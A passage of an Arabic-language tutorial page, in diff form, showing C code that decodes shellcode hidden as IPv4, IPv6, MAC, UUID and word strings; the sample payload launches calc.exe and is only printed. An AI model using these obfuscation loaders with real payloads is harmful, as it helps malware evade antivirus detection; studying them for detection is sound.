+                
+                                &nbsp;&nbsp;&nbsp;&nbsp;if ((STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &Terminator, TmpBuffer)) != 0x0) {<br><br>
+                
+                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv4Array[i], STATUS);<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;}<br><br>
+                
+                
+                                    &nbsp;&nbsp;&nbsp;&nbsp;TmpBuffer = (PBYTE)(TmpBuffer + 4);<br>
+                                    &nbsp;&nbsp;}<br><br>
+                
+                                    &nbsp;&nbsp;*ppDAddress = pBuffer;<br>
+                                    &nbsp;&nbsp;*pDSize = sBuffSize;<br>
+                                    &nbsp;&nbsp;return TRUE;<br>
+                }<br><br>
+                
+                int main() {<br>
+                    &nbsp;&nbsp;PBYTE Shellcode = NULL;<br>
+                    &nbsp;&nbsp;SIZE_T ShellcodeSize = 0;<br><br>
+                
+                    &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Convert from IPv4 ...\n");<br>
+                    &nbsp;&nbsp;getchar();<br><br>
+                
+                    &nbsp;&nbsp;printf("[i] Converting shellcode...\n");<br><br>
+                
+                    &nbsp;&nbsp;if (Ipv4Deobfuscation(Ipv4Array, NumberOfElements, &Shellcode, &ShellcodeSize)) {<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[i] Shellcode converted successfully! Size: %zu bytes\n", ShellcodeSize);<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;printf("\t");<br><br>
+                
+                        &nbsp;&nbsp;&nbsp;&nbsp;for (SIZE_T i = 0; i < ShellcodeSize; i++) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%02X ", Shellcode[i]);<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ((i + 1) % 16 == 0) printf("\n\t");<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;printf("\n");<br><br>
+                
+                
+                        &nbsp;&nbsp;&nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, Shellcode);<br>
+                        &nbsp;&nbsp;}<br>
+                    &nbsp;&nbsp;else {<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] Failed to convert shellcode.\n");<br>
+                        &nbsp;&nbsp;}<br><br>
+                
+                    &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit ...\n");<br>
+                    &nbsp;&nbsp;getchar();<br><br>
+                
+                    &nbsp;&nbsp;return 0;<br>
+                }<br>
+                    </code></div>
+                <br>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">2.2 IPv6 to Shellcode :</h3>
+                <p>[+] تاني تكنيك معانا وهو هنرجع الـ IPv6 للـ شيل كود :</p>
+                <ol>
+                    <li>أول جزء هنضيف الـ IPv6 ، وباقي الأكواد نفس فكرة الـ IPv4 .. وهتعرف تفهمهم لوحدك لما تقرأ.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Deobfs-IPv6-1.png" alt="IPv6ToShellcode-1" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ul>
+                    <li>تمام ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Deobfs-IPv6-2.png" alt="IPv6ToShellcode-2" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p style="font-weight: bold;">[+] الكود النهائي :</p>
+                <div class="code-block"><code>#include &lt;Windows.h><br>
+                #include &lt;stdio.h><br><br>
+                char* Ipv6Array[] = {<br>
+                    &nbsp;&nbsp;"FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",<br>
+                    &nbsp;&nbsp;"AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED", "5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",<br>
+                    &nbsp;&nbsp;"8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1", "38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",<br>
+                    &nbsp;&nbsp;"8B40:2449:01D0:6641:8B0C:4844:8B40:1C49", "01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",<br>
+                    &nbsp;&nbsp;"595A:488B:12E9:57FF:FFFF:5D48:BA01:0000", "0000:0000:0048:8D8D:0101:0000:41BA:318B", "6F87:FFD5:BBF0:B5A2:5641:BAA6:95BD:9DFF",<br>
+                    &nbsp;&nbsp;"D548:83C4:283C:067C:0A80:FBE0:7505:BB47", "1372:6F6A:0059:4189:DAFF:D563:616C:632E", "6578:6500:9090:9090:9090:9090:9090:9090"<br>
+            };<br><br>
+            
+            #define NumberOfElements 18<br><br>
+            
+            
+            typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(<br>
+            &nbsp;&nbsp;PCSTR                   S,<br>
+            &nbsp;&nbsp;PCSTR* Terminator,<br>
+            &nbsp;&nbsp;PVOID                   Addr<br>
+                );<br><br>
+            
+            
+            BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {<br><br>
+            
+                &nbsp;&nbsp;PBYTE           pBuffer = NULL,<br>
+                &nbsp;&nbsp;TmpBuffer = NULL;<br><br>
+            
+                &nbsp;&nbsp;SIZE_T          sBuffSize = NULL;<br><br>
+            
+                &nbsp;&nbsp;PCSTR           Terminator = NULL;
+                <br><br>
+                &nbsp;&nbsp;NTSTATUS        STATUS = NULL;<br><br>
+            
+                &nbsp;&nbsp;fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");<br>
+                &nbsp;&nbsp;if (pRtlIpv6StringToAddressA == NULL) {<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                    &nbsp;&nbsp;}<br>
+                    &nbsp;&nbsp;sBuffSize = NmbrOfElements * 16;<br>
+                    &nbsp;&nbsp;pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);<br>
+                    &nbsp;&nbsp;if (pBuffer == NULL) {<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                        &nbsp;&nbsp;}<br>
+                        &nbsp;&nbsp;TmpBuffer = pBuffer;<br><br>
+            
+            
+                        &nbsp;&nbsp;for (int i = 0; i < NmbrOfElements; i++) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv6Array[i], STATUS);<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;}<br><br>
+            
+                                &nbsp;&nbsp;TmpBuffer = (PBYTE)(TmpBuffer + 16);<br>
+                                &nbsp;&nbsp;}<br><br>
+            
+                                &nbsp;&nbsp;*ppDAddress = pBuffer;<br>
+                                &nbsp;&nbsp;*pDSize = sBuffSize;<br>
+                                &nbsp;&nbsp;return TRUE;<br>
+            }<br><br>
+            
+            int main() {<br>
+                &nbsp;&nbsp;PBYTE Shellcode = NULL;<br>
+                &nbsp;&nbsp;SIZE_T ShellcodeSize = 0;<br><br>
+            
+                &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Convert from IPv6 ...\n");<br>
+                &nbsp;&nbsp;getchar();<br><br>
+            
+                &nbsp;&nbsp;printf("[i] Converting shellcode...\n");<br><br>
+            
+                &nbsp;&nbsp;if (Ipv6Deobfuscation(Ipv6Array, NumberOfElements, &Shellcode, &ShellcodeSize)) {<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[i] Shellcode converted successfully! Size: %zu bytes\n", ShellcodeSize);<br>
+                    &nbsp;&nbsp;&nbsp;&nbsp;printf("\t");<br><br>
+            
+                    &nbsp;&nbsp;&nbsp;&nbsp;for (SIZE_T i = 0; i < ShellcodeSize; i++) {<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%02X ", Shellcode[i]);<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ((i + 1) % 16 == 0) printf("\n\t");<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;printf("\n");<br><br>
+            
+            
+                        &nbsp;&nbsp;&nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, Shellcode);<br><br>
+                        &nbsp;&nbsp;}<br>
+                        &nbsp;&nbsp;else {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] Failed to convert shellcode.\n");<br>
+                            &nbsp;&nbsp;}<br><br>
+            
+                            &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit ...\n");<br>
+                            &nbsp;&nbsp;getchar();<br><br>
+            
+                            &nbsp;&nbsp;return 0;<br>
+            }<br>
+
+                </code></div>
+                <br>
+
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">2.3 MAC Address to Shellcode :</h3>
+                <p>[+] تالت تكنيك .. هنرجع الـ MAC Adresses للـ Shellcode .. يلا نشوف :</p>
+                <ol>
+                    <li>هنضيف الـ MAC Addresses .. وباقي الكود متشابه والاختلاف بسيط :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Deobfs-MAC-1.png" alt="MACToShellcode-1" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ul>
+                    <li>تمام ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Deobfs-MAC-2.png" alt="MACToShellcode-2" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p style="font-weight: bold;">[+] الكود النهائي :</p>
+                <div class="code-block"><code>#include &lt;Windows.h><br>
+                #include &lt;stdio.h><br><br>
+                    
+                    char* MacArray[] = {<br>
+                        &nbsp;&nbsp;"FC-48-83-E4-F0-E8", "C0-00-00-00-41-51", "41-50-52-51-56-48", "31-D2-65-48-8B-52", "60-48-8B-52-18-48", "8B-52-20-48-8B-72",<br>
+                        &nbsp;&nbsp;"50-48-0F-B7-4A-4A", "4D-31-C9-48-31-C0", "AC-3C-61-7C-02-2C", "20-41-C1-C9-0D-41", "01-C1-E2-ED-52-41", "51-48-8B-52-20-8B",<br>
+                        &nbsp;&nbsp;"42-3C-48-01-D0-8B", "80-88-00-00-00-48", "85-C0-74-67-48-01", "D0-50-8B-48-18-44", "8B-40-20-49-01-D0", "E3-56-48-FF-C9-41",<br>
+                        &nbsp;&nbsp;"8B-34-88-48-01-D6", "4D-31-C9-48-31-C0", "AC-41-C1-C9-0D-41", "01-C1-38-E0-75-F1", "4C-03-4C-24-08-45", "39-D1-75-D8-58-44",<br>
+                        &nbsp;&nbsp;"8B-40-24-49-01-D0", "66-41-8B-0C-48-44", "8B-40-1C-49-01-D0", "41-8B-04-88-48-01", "D0-41-58-41-58-5E", "59-5A-41-58-41-59",<br>
+                        &nbsp;&nbsp;"41-5A-48-83-EC-20", "41-52-FF-E0-58-41", "59-5A-48-8B-12-E9", "57-FF-FF-FF-5D-48", "BA-01-00-00-00-00", "00-00-00-48-8D-8D",<br>
+                        &nbsp;&nbsp;"01-01-00-00-41-BA", "31-8B-6F-87-FF-D5", "BB-F0-B5-A2-56-41", "BA-A6-95-BD-9D-FF", "D5-48-83-C4-28-3C", "06-7C-0A-80-FB-E0",<br>
+                        &nbsp;&nbsp;"75-05-BB-47-13-72", "6F-6A-00-59-41-89", "DA-FF-D5-63-61-6C", "63-2E-65-78-65-00"
+                    };<br><br>
+                    
+                    #define NumberOfElements 46<br><br>
+                    
+                    
+                    typedef NTSTATUS(NTAPI* fnRtlEthernetStringToAddressA)(<br>
+                    &nbsp;&nbsp;PCSTR                   S,<br>
+                    &nbsp;&nbsp;PCSTR* Terminator,<br>
+                    &nbsp;&nbsp;PVOID                   Addr<br>
+                        );<br><br>
+                    
+                    
+                    BOOL MacDeobfuscation(IN CHAR* MacArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {<br><br>
+                    
+                        &nbsp;&nbsp;PBYTE           pBuffer = NULL,<br>
+                        &nbsp;&nbsp;TmpBuffer = NULL;<br><br>
+                    
+                        &nbsp;&nbsp;SIZE_T          sBuffSize = NULL;<br><br>
+                    
+                        &nbsp;&nbsp;PCSTR           Terminator = NULL;<br><br>
+                    
+                        &nbsp;&nbsp;NTSTATUS        STATUS = NULL;<br><br>
+                    
+                        &nbsp;&nbsp;fnRtlEthernetStringToAddressA  pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlEthernetStringToAddressA");<br>
+                        &nbsp;&nbsp;if (pRtlEthernetStringToAddressA == NULL) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                            &nbsp;&nbsp;}<br>
+                        &nbsp;&nbsp;sBuffSize = NmbrOfElements * 6;<br>
+                        &nbsp;&nbsp;pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);<br>
+                        &nbsp;&nbsp;if (pBuffer == NULL) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                            &nbsp;&nbsp;}<br>
+                        &nbsp;&nbsp;TmpBuffer = pBuffer;<br><br>
+                    
+                    
+                        &nbsp;&nbsp;for (int i = 0; i < NmbrOfElements; i++) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;if ((STATUS = pRtlEthernetStringToAddressA(MacArray[i], &Terminator, TmpBuffer)) != 0x0) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("[!] RtlEthernetStringToAddressA  Failed At [%s] With Error 0x%0.8X\n", MacArray[i], STATUS);<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;}<br><br>
+                    
+                            &nbsp;&nbsp;&nbsp;&nbsp;TmpBuffer = (PBYTE)(TmpBuffer + 6);<br>
+                            &nbsp;&nbsp;}<br><br>
+                    
+                        &nbsp;&nbsp;*ppDAddress = pBuffer;<br>
+                        &nbsp;&nbsp;*pDSize = sBuffSize;<br>
+                        &nbsp;&nbsp;return TRUE;<br>
+                    }<br>
+                    int main() {<br>
+                        &nbsp;&nbsp;PBYTE Shellcode = NULL;<br>
+                        &nbsp;&nbsp;SIZE_T ShellcodeSize = 0;<br><br>
+                    
+                        &nbsp;&nbsp;printf("[i] Press &lt;Enter> to convert from MAC ...\n");<br>
+                        &nbsp;&nbsp;getchar();<br><br>
+                    
+                        &nbsp;&nbsp;printf("[i] Converting shellcode...\n");<br><br>
+                    
+                        &nbsp;&nbsp;if (MacDeobfuscation(MacArray, NumberOfElements, &Shellcode, &ShellcodeSize)) {<br><br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[i] Shellcode converted successfully! Size: %zu bytes\n", ShellcodeSize);<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;printf("\t");<br><br>
+                    
+                            &nbsp;&nbsp;&nbsp;&nbsp;for (SIZE_T i = 0; i < ShellcodeSize; i++) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%02X ", Shellcode[i]);<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ((i + 1) % 16 == 0) printf("\n\t");<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("\n");<br><br>
+                    
+                    
+                                &nbsp;&nbsp;&nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, Shellcode);<br>
+                                &nbsp;&nbsp;}<br>
+                                &nbsp;&nbsp;else {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] Failed to convert shellcode.\n");<br>
+                                    &nbsp;&nbsp;}<br><br>
+                    
+                                    &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit ...\n");<br>
+                                    &nbsp;&nbsp;getchar();<br><br>
+                    
+                                    &nbsp;&nbsp;return 0;<br>
+                    }<br>
+                </code></div>
+                <br>
+
+
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">2.4 UUID to Shellcode :</h3>
+                <p>[+] هنرجع الـ UUIDs لـ شيل كود :</p>
+                <ul>
+                    <li>هنضيف الـ UUIDs .. والباقي إنت عارفه :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Deobfs-UUID-1.png" alt="UUIDToShellcode-1" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ul>
+                    <li>تمام ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Deobfs-UUID-2.png" alt="UUIDToShellcode-2" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p style="font-weight: bold;">[+] الكود النهائي :</p>
+                <div class="code-block"><code>#include &lt;Windows.h><br>
+                    #include &lt;stdio.h><br>
+                    #include &lt;Rpc.h><br><br>
+                    
+                    #pragma comment(lib, "Rpcrt4.lib")<br><br>
+                    
+                    
+                    char* UuidArray[] = {<br>
+                        &nbsp;&nbsp;"E48348FC-E8F0-00C0-0000-415141505251", "D2314856-4865-528B-6048-8B5218488B52", "728B4820-4850-B70F-4A4A-4D31C94831C0",<br>
+                        &nbsp;&nbsp;"7C613CAC-2C02-4120-C1C9-0D4101C1E2ED", "48514152-528B-8B20-423C-4801D08B8088", "48000000-C085-6774-4801-D0508B481844",<br>
+                        &nbsp;&nbsp;"4920408B-D001-56E3-48FF-C9418B348848", "314DD601-48C9-C031-AC41-C1C90D4101C1", "F175E038-034C-244C-0845-39D175D85844",<br>
+                        &nbsp;&nbsp;"4924408B-D001-4166-8B0C-48448B401C49", "8B41D001-8804-0148-D041-5841585E595A", "59415841-5A41-8348-EC20-4152FFE05841",<br>
+                        &nbsp;&nbsp;"8B485A59-E912-FF57-FFFF-5D48BA010000", "00000000-4800-8D8D-0101-000041BA318B", "D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF",<br>
+                        &nbsp;&nbsp;"C48348D5-3C28-7C06-0A80-FBE07505BB47", "6A6F7213-5900-8941-DAFF-D563616C632E", "00657865-9090-9090-9090-909090909090"<br>
+                    };<br><br>
+                    
+                    #define NumberOfElements 18<br><br>
+                    
+                    
+                    typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(<br>
+                    &nbsp;&nbsp;RPC_CSTR        StringUuid,<br>
+                    &nbsp;&nbsp;UUID* Uuid<br>
+                    &nbsp;&nbsp;);<br><br>
+                    
+                    
+                    BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {<br><br>
+                    
+                        &nbsp;&nbsp;PBYTE           pBuffer = NULL,<br>
+                        &nbsp;&nbsp;TmpBuffer = NULL;<br><br>
+                    
+                        &nbsp;&nbsp;SIZE_T          sBuffSize = NULL;<br><br>
+                    
+                        &nbsp;&nbsp;PCSTR           Terminator = NULL;<br><br>
+                    
+                        &nbsp;&nbsp;NTSTATUS        STATUS = NULL;<br><br>
+                    
+                        &nbsp;&nbsp;fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");<br>
+                        &nbsp;&nbsp;if (pUuidFromStringA == NULL) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                            &nbsp;&nbsp;}<br>
+                            &nbsp;&nbsp;sBuffSize = NmbrOfElements * 16;<br>
+                            &nbsp;&nbsp;pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);<br>
+                            &nbsp;&nbsp;if (pBuffer == NULL) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;}<br>
+                                &nbsp;&nbsp;TmpBuffer = pBuffer;<br><br>
+                    
+                    
+                                &nbsp;&nbsp;for (int i = 0; i < NmbrOfElements; i++) {<br>
+                                    &nbsp;&nbsp;if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] UuidFromStringA  Failed At [%s] With Error 0x%0.8X\n", UuidArray[i], STATUS);<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;}<br><br>
+                    
+                                        &nbsp;&nbsp;&nbsp;&nbsp;TmpBuffer = (PBYTE)(TmpBuffer + 16);<br>
+                                        &nbsp;&nbsp;}<br><br>
+                    
+                                        &nbsp;&nbsp;*ppDAddress = pBuffer;<br>
+                                        &nbsp;&nbsp;*pDSize = sBuffSize;<br>
+                                        &nbsp;&nbsp;return TRUE;<br>
+                    }<br>
+                    
+                    int main() {<br>
+                        &nbsp;&nbsp;PBYTE Shellcode = NULL;<br>
+                        &nbsp;&nbsp;SIZE_T ShellcodeSize = 0;<br><br>
+                    
+                        &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Convert from UUIDs ...\n");<br>
+                        &nbsp;&nbsp;getchar();<br><br>
+                    
+                        &nbsp;&nbsp;printf("[i] Converting shellcode...\n");<br><br>
+                    
+                        &nbsp;&nbsp;if (UuidDeobfuscation(UuidArray, NumberOfElements, &Shellcode, &ShellcodeSize)) {<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;printf("[i] Shellcode converted successfully! Size: %zu bytes\n", ShellcodeSize);<br>
+                            &nbsp;&nbsp;&nbsp;&nbsp;printf("\t");<br><br>
+                    
+                            &nbsp;&nbsp;&nbsp;&nbsp;for (SIZE_T i = 0; i < ShellcodeSize; i++) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%02X ", Shellcode[i]);<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ((i + 1) % 16 == 0) printf("\n\t");<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("\n");<br><br>
+                    
+                    
+                                &nbsp;&nbsp;&nbsp;&nbsp;HeapFree(GetProcessHeap(), 0, Shellcode);<br>
+                                &nbsp;&nbsp;}<br>
+                                &nbsp;&nbsp;else {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] Failed to convert shellcode.\n");<br>
+                                    &nbsp;&nbsp;}<br><br>
+                    
+                                    &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit ...\n");<br>
+                                    &nbsp;&nbsp;getchar();<br><br>
+                    
+                                    &nbsp;&nbsp;return 0;<br>
+                    }<br>
+                    
+
+                </code></div>
+                <br>
+
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <h3 style="direction: ltr;">2.5 Words to Shellcode :</h3>
+                <p>آخر تكنيك .. هنرجع الشيل كود من الكلمات اللـ حولناها.</p>
+                <ol>
+                    <li>هنضيف الـ Dectionary .. اللـ استخدمناه عشان نحول من الشيل كود.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Deobfs-Words-1.png" alt="WordsToShellcode-1" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>ودا الشيل كود بعد مـ اتحول لكلمات .. والباقي سهل وبسيط :</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Deobfs-Words-2.png" alt="WordsToShellcode-2" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ol>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ul>
+                    <li>تمام ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Deobfs-Words-3.png" alt="WordsToShellcode-3" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p style="font-weight: bold;">[+] الكود النهائي :</p>
+                <div class="code-block"><code>#include &lt;Windows.h><br>
+                #include &lt;stdio.h><br><br>
+                int main(void)
+{<br>
+	&nbsp;&nbsp;unsigned char* translation_table[256] = { "music","taste","wings","audio","endif","winds","crime","bonus","lanka","honey",<br>
+    &nbsp;&nbsp;"simon","manor","screw","puppy","surge","watts","upper","dance","touch","heavy","tumor","scale","acute","wider","strap",<br>
+    &nbsp;&nbsp;"tooth","colon","karen","fever","quiet","chart","donna","yacht","human","devil","belly","heath","class","shall","these",<br>
+    &nbsp;&nbsp;"funds","discs","atlas","dying","arrow","spies","pairs","young","amber","exist","glory","offer","swift","focal","larry",<br>
+    &nbsp;&nbsp;"bobby","tires","items","skirt","adult","blond","roman","stick","elvis","slope","scuba","value","lexus","cells","happy",<br>
+    &nbsp;&nbsp;"joins","india","yards","smoke","train","bacon","sheet","blink","dairy","latex","feels","guide","shoot","holly","armor",<br>
+    &nbsp;&nbsp;"bench","tours","cedar","fires","bands","firms","roads","known","going","mails","speak","laugh","heard","study","logan",<br>
+    &nbsp;&nbsp;"packs","level","carey","shirt","loose","tapes","goals","maine","uncle","shine","dense","cases","cache","cards","favor",<br>
+    &nbsp;&nbsp;"disks","coins","nokia","enter","fatty","bring","anger","singh","tribe","notre","saint","emily","moses","brown","kathy",<br>
+    &nbsp;&nbsp;"busty","squad","gamma","debug","nikon","judge","guest","claim","lobby","bears","maybe","close","basic","catch","alarm",<br>
+    &nbsp;&nbsp;"meant","chain","meyer","vital","clock","keith","ports","theme","enjoy","abuse","rooms","pipes","broad","words","outer",<br>
+    &nbsp;&nbsp;"point","users","paste","aruba","hairy","spice","taxes","teach","paris","plate","roger","title","stone","gates","texts",<br>
+    &nbsp;&nbsp;"smart","trade","berry","worry","photo","tunes","storm","panic","pumps","hello","fuzzy","mouth","joyce","grows","email",<br>
+    &nbsp;&nbsp;"teddy","pills","birth","games","pride","skype","meter","yours","lyric","means","picks","diane","wagon","rouge","kevin",<br>
+    &nbsp;&nbsp;"focus","scott","dolls","frost","today","small","alpha","track","smith","james","wanna","buses","spots","eight","stuck",<br>
+    &nbsp;&nbsp;"indie","clean","weeks","jewel","solve","opens","civic","usage","array","nodes","mason","roots","sugar","dirty","sight",<br>
+    &nbsp;&nbsp;"jesus","lloyd","strip","dream","might","tions","grams","brass","hired","julia","crazy","flood","march","combo","drops",<br>
+    &nbsp;&nbsp;"delta","shaft","spank","jesse","arena","visit" };<br><br>
+
+	&nbsp;&nbsp;unsigned char* translated_shellcode[196] = {<br>
+        &nbsp;&nbsp;"spank", "yards", "squad", "array", "tions", "sugar", "birth", "music",<br>
+        &nbsp;&nbsp;"music", "music", "scuba", "guide", "scuba", "feels", "shoot", "guide",<br>
+        &nbsp;&nbsp;"tours", "yards", "exist", "small", "level", "yards", "bears", "shoot",<br>
+        &nbsp;&nbsp;"laugh", "yards", "bears", "shoot", "strap", "yards", "bears", "shoot",<br>
+        &nbsp;&nbsp;"yacht", "yards", "bears", "favor", "feels", "yards", "watts", "pumps",<br>
+        &nbsp;&nbsp;"train", "train", "blink", "exist", "diane", "yards", "exist", "birth",<br>
+        &nbsp;&nbsp;"stone", "blond", "heard", "notre", "wings", "arrow", "yacht", "scuba",<br>
+        &nbsp;&nbsp;"games", "diane", "puppy", "scuba", "taste", "games", "civic", "strip",<br>
+        &nbsp;&nbsp;"shoot", "scuba", "guide", "yards", "bears", "shoot", "yacht", "bears",<br>
+        &nbsp;&nbsp;"value", "blond", "yards", "taste", "frost", "bears", "brown", "guest",<br>
